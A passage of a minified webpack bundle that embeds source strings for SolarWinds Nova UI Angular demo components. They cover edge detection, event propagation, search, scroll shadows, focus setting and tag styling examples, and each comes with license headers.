</div>\n                    <div\n                        class="deposit to-be-aligned left"\n                        [ngStyle]="{\n                            width: deposit.width + \'px\',\n                            display: showAligned.left ? \'flex\' : \'none\'\n                        }"\n                    >\n                        <div class="arrow arrow-right"></div>\n                        <div class="line"></div>\n                    </div>\n                    <div\n                        class="deposit to-be-aligned right"\n                        [ngStyle]="{\n                            width: deposit.width + \'px\',\n                            display: showAligned.right ? \'flex\' : \'none\'\n                        }"\n                    >\n                        <div class="arrow arrow-left"></div>\n                        <div class="line"></div>\n                    </div>\n                    <div\n                        class="deposit to-be-aligned bottom"\n                        [ngStyle]="{\n                            height: deposit.height + \'px\',\n                            display: showAligned.bottom ? \'flex\' : \'none\'\n                        }"\n                    >\n                        <div class="arrow arrow-up"></div>\n                        <div class="line"></div>\n                    </div>\n                    <div\n                        class="deposit-reference"\n                        [ngStyle]="{\n                            width: deposit.width + \'px\',\n                            height: deposit.height + \'px\'\n                        }"\n                        #placementElement\n                    ></div>\n                </div>\n            </div>\n        </div>\n        <div style="display: inline-block"></div>\n    </div>\n</div>\n'},4276:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t="#nui-demo-services-edge-detection .results {\n    display: flex;\n    display: -ms-flexbox;\n}\n\n#nui-demo-services-edge-detection .deposit {\n    position: absolute;\n    pointer-events: none;\n    display: flex;\n    display: -ms-flexbox;\n}\n\n#nui-demo-services-edge-detection .deposit-reference {\n    display: none;\n}\n\n#nui-demo-services-edge-detection .deposit.top,\n#nui-demo-services-edge-detection .deposit.bottom {\n    justify-content: center;\n    border-top: 1px solid #ff0000;\n    border-bottom: 1px solid #ff0000;\n    width: 100%;\n}\n\n#nui-demo-services-edge-detection .deposit.left,\n#nui-demo-services-edge-detection .deposit.right {\n    align-items: center;\n    border-left: 1px solid #ff0000;\n    border-right: 1px solid #ff0000;\n    height: 100%;\n}\n\n#nui-demo-services-edge-detection .deposit .arrow {\n    width: 0px;\n    height: 0px;\n}\n\n#nui-demo-services-edge-detection .arrow-up {\n    border-left: 15px solid transparent;\n    border-right: 15px solid transparent;\n    border-bottom: 25px solid #ff0000;\n}\n\n#nui-demo-services-edge-detection .arrow-down {\n    border-left: 15px solid transparent;\n    border-right: 15px solid transparent;\n    border-top: 25px solid #ff0000;\n}\n\n#nui-demo-services-edge-detection .arrow-left {\n    border-top: 15px solid transparent;\n    border-bottom: 15px solid transparent;\n    border-right: 25px solid #ff0000;\n}\n\n#nui-demo-services-edge-detection .arrow-right {\n    border-top: 15px solid transparent;\n    border-bottom: 15px solid transparent;\n    border-left: 25px solid #ff0000;\n}\n\n#nui-demo-services-edge-detection .deposit.top .line,\n#nui-demo-services-edge-detection .deposit.bottom .line {\n    width: 50%;\n    height: 100%;\n    border-right: #ff0000 solid 2px;\n    position: absolute;\n    left: 1px;\n    top: 0px;\n}\n\n#nui-demo-services-edge-detection .deposit.left .line,\n#nui-demo-services-edge-detection .deposit.right .line {\n    width: 100%;\n    height: 50%;\n    border-bottom: #ff0000 solid 2px;\n    position: absolute;\n    top: 1px;\n    left: 0px;\n}\n\n#nui-demo-services-edge-detection .base-point {\n    display: inline-block;\n    position: relative;\n    background-color: #fff;\n}\n\n#nui-demo-services-edge-detection .parent-component {\n    display: table-cell;\n    min-width: 300px;\n    min-height: 50px;\n    vertical-align: middle;\n    text-align: center;\n}\n\n#nui-demo-services-edge-detection .nui-edge-definer {\n    background-color: rgba(1, 1, 1, 0.2);\n}\n\n#nui-demo-services-edge-detection .to-be-placed.left,\n#nui-demo-services-edge-detection .to-be-placed.right {\n    top: 0px;\n}\n\n.to-be-placed.top {\n    bottom: 100%;\n}\n\n.to-be-placed.right {\n    left: 100%;\n    justify-content: flex-end;\n}\n\n.to-be-placed.bottom {\n    align-items: flex-end;\n}\n\n.to-be-placed.left {\n    right: 100%;\n}\n\n.to-be-aligned.top {\n    top: 0px;\n    left: 0px;\n    align-items: flex-end;\n}\n\n.to-be-aligned.right {\n    top: 0px;\n    right: 0px;\n    margin-bottom: -8px;\n}\n\n.to-be-aligned.bottom {\n    bottom: 0px;\n}\n\n.to-be-aligned.left {\n    justify-content: flex-end;\n    top: 0px;\n}\n"},60852:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { AfterViewInit, Component, ElementRef, ViewChild } from "@angular/core";\nimport _set from "lodash/set";\n\nimport { EdgeDetectionService, IEdgeDetectionResult } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-edge-detection-service-example",\n    templateUrl: "./edge-detection-service.example.component.html",\n    styleUrls: ["./edge-detection-service.example.component.less"],\n})\nexport class EdgeDetectionServiceExampleComponent implements AfterViewInit {\n    @ViewChild("parent") private parentElement: ElementRef;\n    @ViewChild("placementElement") private toBePlacedElement: ElementRef;\n\n    public showPlaced: any = {};\n    public showAligned: any = {};\n    public deposit = {\n        width: 100,\n        height: 50,\n    };\n    public parentComponent = {\n        width: 300,\n        height: 150,\n    };\n    public addEdgeDefinerClass = false;\n\n    public canBe?: IEdgeDetectionResult = {\n        placed: {\n            top: false,\n            right: false,\n            bottom: false,\n            left: false,\n        },\n        aligned: {\n            top: false,\n            right: false,\n            bottom: false,\n            left: false,\n        },\n    };\n\n    constructor(private edgeDetectionService: EdgeDetectionService) {}\n\n    public ngAfterViewInit(): void {\n        this.update();\n    }\n\n    public update(): void {\n        setTimeout(() => {\n            const parent = this.parentElement.nativeElement;\n            const basePointElement = parent.querySelector(\n                ".base-point-element"\n            );\n\n            if (this.parentComponent.width < 300) {\n                this.parentComponent.width = 300;\n            }\n\n            if (this.parentComponent.height < 50) {\n                this.parentComponent.height = 50;\n            }\n\n            if (this.addEdgeDefinerClass) {\n                parent.classList.add("nui-edge-definer");\n            } else {\n                parent.classList.remove("nui-edge-definer");\n            }\n\n            this.canBe = this.edgeDetectionService.canBe(\n                basePointElement,\n                this.toBePlacedElement.nativeElement\n            );\n        });\n    }\n\n    public switchCheckbox(): void {\n        this.addEdgeDefinerClass = !this.addEdgeDefinerClass;\n        this.update();\n    }\n\n    public changeText(path: string, value: any): void {\n        _set(this, path, value);\n        this.update();\n    }\n}\n'},83864:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui-demo-event-propagation-service">\n    <h2>Shouldn\'t propagate examples:</h2>\n    <nui-textbox\n        value="Textbox"\n        customBoxWidth="150px"\n        (click)="handleClick($event)"\n    >\n    </nui-textbox>\n    <button\n        nui-button\n        type="button"\n        (click)="handleClick($event)"\n        displayStyle="primary"\n    >\n        Button\n    </button>\n    <nui-radio value="readonly" [checked]="false" (click)="handleClick($event)"\n        >Radio\n    </nui-radio>\n\n    <nui-checkbox\n        value="example"\n        [checked]="false"\n        (click)="handleClick($event)"\n        >Checkbox\n    </nui-checkbox>\n    <a role="button" (click)="handleClick($event)">Link</a>\n    <nui-divider></nui-divider>\n    <h2>Should propagate examples:</h2>\n    <div (click)="handleClick($event)">\n        <nui-icon icon="severity_info" iconSize="small"></nui-icon>\n        Icon\n    </div>\n    <h4 (click)="handleClick($event)">Header</h4>\n    <p (click)="handleClick($event)">Paragraph</p>\n</div>\n\n<style>\n    .nui-demo-event-propagation-service {\n        max-width: 260px;\n    }\n</style>\n'},11016:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject } from "@angular/core";\n\nimport {\n    EventPropagationService,\n    IEventPropagationService,\n    IToastService,\n    ToastService,\n} from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-event-propagation-service-example",\n    templateUrl: "./event-propagation-service.example.component.html",\n})\nexport class EventPropagationServiceExampleComponent {\n    constructor(\n        @Inject(EventPropagationService)\n        private eventPropagationService: IEventPropagationService,\n        @Inject(ToastService) private toastService: IToastService\n    ) {}\n\n    public handleClick(event: Event): void {\n        const target = <Element>event.target;\n        this.toastService.clear();\n        if (this.eventPropagationService.targetShouldPropagate(event)) {\n            this.toastService.success({\n                message: "Event Target Tag Name: " + target.tagName,\n                title: "Event Propagates!",\n            });\n        } else {\n            this.toastService.warning({\n                message: "Event Target Tag Name: " + target.tagName,\n                title: "Event Doesn\'t Propagate!",\n            });\n        }\n    }\n}\n'},93298:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./clipboard/clipboard.example.component";\nexport * from "./data-filter/index";\nexport * from "./data-source/index";\nexport * from "./edge-detection-service/edge-detection-service.example.component";\nexport * from "./event-propagation-service/event-propagation-service.example.component";\nexport * from "./scroll-shadows/scroll-shadows.example.component";\nexport * from "./search-service/search-service.example.component";\nexport * from "./set-focus/set-focus.example.component";\nexport * from "./welcome/welcome-page.component";\n'},64284:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div style="width: 320px">\n    <div>\n        <div\n            class="nui-scroll-shadows"\n            style="\n                height: 400px;\n                overflow-y: auto;\n                padding: 0 5px;\n                border: 1px solid #ccc;\n            "\n        >\n            <div style="text-align: center">\n                <h3 i18n>Aerials</h3>\n                <h5><i i18n>System of a Down</i></h5>\n            </div>\n            <div style="margin: auto 10px" i18n>\n                Life is a waterfall<br />\n                We\'re one in the river<br />\n                And one again after the fall<br />\n                Swimming through the void<br />\n                We hear the word<br />\n                We lose ourselves<br />\n                But we find it all?<br />\n                \'Cause we are the ones that want to play<br />\n                Always want to go<br />\n                But you never want to stay<br />\n                And we are the ones that want to choose<br />\n                Always want to play<br />\n                But you never want to lose<br />\n                Aerials in the sky<br />\n                When you lose small mind<br />\n                You free your life<br />\n                Life is a waterfall<br />\n                We drink from the river<br />\n                Then we turn around and put up our walls<br />\n                Swimming through the void<br />\n                We hear the word<br />\n                We lose ourselves<br />\n                But we find it all?<br />\n                \'Cause we are the ones that want to play<br />\n                Always want to go<br />\n                But you never want to stay<br />\n                And we are the ones that want to choose<br />\n                Always want to play<br />\n                But you never want to lose<br />\n                Aerials in the sky<br />\n                When you lose small mind<br />\n                You free your life<br />\n                Aerials so up high<br />\n                When you free your eyes<br />\n                Eternal prize<br />\n                Aerials in the sky<br />\n                When you lose small mind<br />\n                You free your life<br />\n                Aerials so up high<br />\n                When you free your eyes<br />\n                Eternal prize<br />\n            </div>\n        </div>\n    </div>\n</div>\n'},16652:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-scroll-shadows-example",\n    templateUrl: "./scroll-shadows.example.component.html",\n})\nexport class ScrollShadowsExampleComponent {}\n'},42482:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<style>\n    .searchservice {\n        width: 100%;\n    }\n    .searchservice-demo-data-left {\n        width: 50%;\n    }\n</style>\n\n<nui-search-service-example>\n    <h1>Search Service</h1>\n    <h3>Original items</h3>\n    <pre class="searchservice-demo-data-left">{{ itemsFormatted }}</pre>\n    <p>Search this value</p>\n    <input\n        [(ngModel)]="searchValue"\n        class="searchservice"\n        placeholder="Type something to search"\n    /><br />\n    <nui-checkbox-group\n        [(values)]="props"\n        (valuesChange)="valuesChanged($event)"\n    >\n        <nui-checkbox [value]="1">Property \'stringContainer\'</nui-checkbox>\n        <nui-checkbox [value]="2">Property \'numberContainer\'</nui-checkbox>\n        <nui-checkbox [value]="3">Property \'dateContainer\'</nui-checkbox>\n    </nui-checkbox-group>\n    <button nui-button type="button" displayStyle="primary" (click)="search()">\n        Search\n    </button>\n    <br /><br />\n    <h3>Search result</h3>\n    <pre class="searchservice-demo-data-left">{{ searchResultFormatted }}</pre>\n    <nui-divider></nui-divider>\n</nui-search-service-example>\n'},68750:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject } from "@angular/core";\nimport _includes from "lodash/includes";\n\nimport { ISearchService, SearchService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-search-service-example",\n    templateUrl: "./search-service.example.component.html",\n})\nexport class SearchServiceExampleComponent {\n    private now = new Date().getTime();\n    private week = 7 * 24 * 60 * 60 * 1000; // milliseconds 7 * 24 * 60 * 60 * 1000\n    public items = [\n        {\n            stringContainer: "abc",\n            numberContainer: 123,\n            dateContainer: new Date(this.now - this.week),\n        },\n        {\n            stringContainer: "abcd",\n            numberContainer: 1234,\n            dateContainer: new Date(this.now),\n        },\n        {\n            stringContainer: "abcde",\n            numberContainer: 12345,\n            dateContainer: new Date(this.now + this.week),\n        },\n    ];\n    public itemsFormatted = JSON.stringify(this.items, null, 2);\n    public searchResult: any;\n    public searchResultFormatted: any;\n    public searchValue: any;\n    public props = ["stringContainer", "numberContainer", "dateContainer"];\n\n    constructor(@Inject(SearchService) private searchService: ISearchService) {}\n\n    public valuesChanged(values: any[]): void {\n        this.props = [...values];\n    }\n\n    public search(): void {\n        const props = this.getProps();\n        this.searchResult = this.searchService.search(\n            this.items,\n            props,\n            this.searchValue\n        );\n        this.searchResultFormatted = JSON.stringify(this.searchResult, null, 2);\n    }\n\n    private getProps(): Array<string> {\n        const props = [];\n        if (_includes(this.props, "1")) {\n            this.props = [];\n            props.push("stringContainer");\n        }\n        if (_includes(this.props, "2")) {\n            this.props = [];\n            props.push("numberContainer");\n        }\n        if (_includes(this.props, "3")) {\n            this.props = [];\n            props.push("dateContainer");\n        }\n\n        return props;\n    }\n}\n'},568:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui">\n    <form>\n        <nui-radio-group>\n            <nui-radio\n                id="nui-demo-setfocus-radio-carrot"\n                value="carrot"\n                checked\n                [nuiSetFocus]="carrotFocused"\n                i18n\n            >\n                carrot\n            </nui-radio>\n            <nui-radio\n                id="nui-demo-setfocus-radio-onion"\n                value="onion"\n                [nuiSetFocus]="onionFocused"\n                i18n\n            >\n                onion\n            </nui-radio>\n        </nui-radio-group>\n        <div>\n            <button\n                id="nui-demo-setfocus-button-carrot"\n                nui-button\n                type="button"\n                (click)="setCarrotFocus()"\n                i18n\n            >\n                temporary carrot focus\n            </button>\n            <button\n                id="nui-demo-setfocus-button-onion"\n                nui-button\n                type="button"\n                (click)="setOnionFocus()"\n                i18n\n            >\n                temporary onion focus\n            </button>\n        </div>\n        <div i18n>carrot focused: {{ carrotFocused }}</div>\n        <div i18n>onion focused: {{ onionFocused }}</div>\n    </form>\n</div>\n'},59144:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-set-focus-example",\n    templateUrl: "./set-focus.example.component.html",\n})\nexport class SetFocusExampleComponent {\n    public carrotFocused = false;\n    public onionFocused = false;\n    private interval = 2000;\n\n    public setCarrotFocus(): void {\n        this.carrotFocused = true;\n        setTimeout(() => {\n            this.carrotFocused = false;\n        }, this.interval);\n    }\n\n    public setOnionFocus(): void {\n        this.onionFocused = true;\n        setTimeout(() => {\n            this.onionFocused = false;\n        }, this.interval);\n    }\n}\n'},62369:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./tag-docs/tag-docs.example.component";\nexport * from "./tag-color/tag-color.example.component";\nexport * from "./tag-basic/tag-basic.example.component";\nexport * from "./tag-with-icon/tag-with-icon.example.component";\nexport * from "./tag-border-color/tag-border-color.example.component";\nexport * from "./tag-with-hover/tag-with-hover.example.component";\n'},69343:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui-tag">Tag label</div>\n'},69703:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-tag-basic-example",\n    templateUrl: "./tag-basic.example.component.html",\n})\nexport class TagBasicExampleComponent {}\n'},72455:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui-tag nui-tag-with-border-critical mr-1">Tag critical</div>\n<div class="nui-tag nui-tag-with-border-warning mr-1">Tag warning</div>\n<div class="nui-tag nui-tag-with-border-info mr-1">Tag info</div>\n<div class="nui-tag nui-tag-with-border-ok mr-1">Tag ok</div>\n'},40063:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-tag-border-color-example",\n    templateUrl: "./tag-border-color.example.component.html",\n})\nexport class TagBorderColorExampleComponent {}\n'},89307:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui-tag nui-tag-critical nui-tag-text-light mr-1">Tag critical</div>\n<div class="nui-tag nui-tag-warning mr-1">Tag warning</div>\n<div class="nui-tag nui-tag-info nui-tag-text-light mr-1">Tag info</div>\n<div class="nui-tag nui-tag-ok nui-tag-text-light mr-1">Tag ok</div>\n<div class="nui-tag nui-tag-default mr-1">Tag default</div>\n'},46559:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".nui-tag {\n    border: none;\n}\n"},43875:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-tag-color-example",\n    templateUrl: "./tag-color.example.component.html",\n    styleUrls: ["./tag-color.example.component.less"],\n})\nexport class TagColorExampleComponent {}\n'},52181:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Basic Usage</h2>\n<p>To show tag add <code>.nui-tag</code> class to the element.</p>\n<nui-example-wrapper filenamePrefix="tag-basic" exampleTitle="Tag basic usage">\n    <nui-tag-basic-example></nui-tag-basic-example>\n</nui-example-wrapper>\n\n<h2>Statuses Usage</h2>\n<p>\n    To change tag styles for specific statuses you can use appropriate classes\n    for that (for example, <code>.nui-tag-status</code>). As default, text color\n    is black. You can change it by adding\n    <code>.nui-tag-text-light</code> class.\n</p>\n<nui-example-wrapper filenamePrefix="tag-color" exampleTitle="Tag status usage">\n    <nui-tag-color-example></nui-tag-color-example>\n</nui-example-wrapper>\n\n<h2>Statuses Usage With Border</h2>\n<p>\n    To change tag styles for specific statuses you can use appropriate classes\n    for that (for example, <code>.nui-tag-with-border-status</code>).\n</p>\n<nui-example-wrapper\n    filenamePrefix="tag-border-color"\n    exampleTitle="Tag status usage with border color"\n>\n    <nui-tag-border-color-example></nui-tag-border-color-example>\n</nui-example-wrapper>\n\n<h2>With Icons</h2>\n<p>The example below shows how to customize tags by adding icons.</p>\n<nui-example-wrapper\n    filenamePrefix="tag-with-icon"\n    exampleTitle="Tag with icons"\n>\n    